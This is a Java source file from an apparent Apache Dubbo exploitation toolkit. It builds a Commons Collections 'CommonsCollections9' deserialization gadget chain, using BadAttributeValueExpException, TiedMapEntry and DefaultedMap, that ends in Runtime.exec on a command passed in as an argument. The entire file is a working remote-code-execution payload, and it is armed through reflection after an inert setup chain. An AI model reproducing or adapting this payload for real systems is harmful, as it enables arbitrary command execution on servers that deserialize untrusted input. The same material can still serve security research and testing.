package com.threedr3am.exp.dubbo.payload.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */

/**
 * commons-collections:commons-collections:3.1
 */
public class CommonsCollections9 implements Payload {

	private String[] args;

	/**
	 *
	 * @param args
	 *
	 * arg[0]=cmd
	 *
	 * @return
	 * @throws Exception
	 */
	@Override
	public Object getPayload(String[] args) throws Exception {
		if (this.args != null)
			args = this.args;
		final String[] execArgs = args;
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						null, new Object[0] }),
				new InvokerTransformer("exec",
						new Class[]{execArgs.length > 1 ? String[].class : String.class}, execArgs.length > 1 ? new Object[]{execArgs} : execArgs),
				new ConstantTransformer(1) };
		final Map innerMap = new HashMap();

		final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	@Override
	public void injectDefaultArgs(String[] args) {
		this.args = args;
	}

}
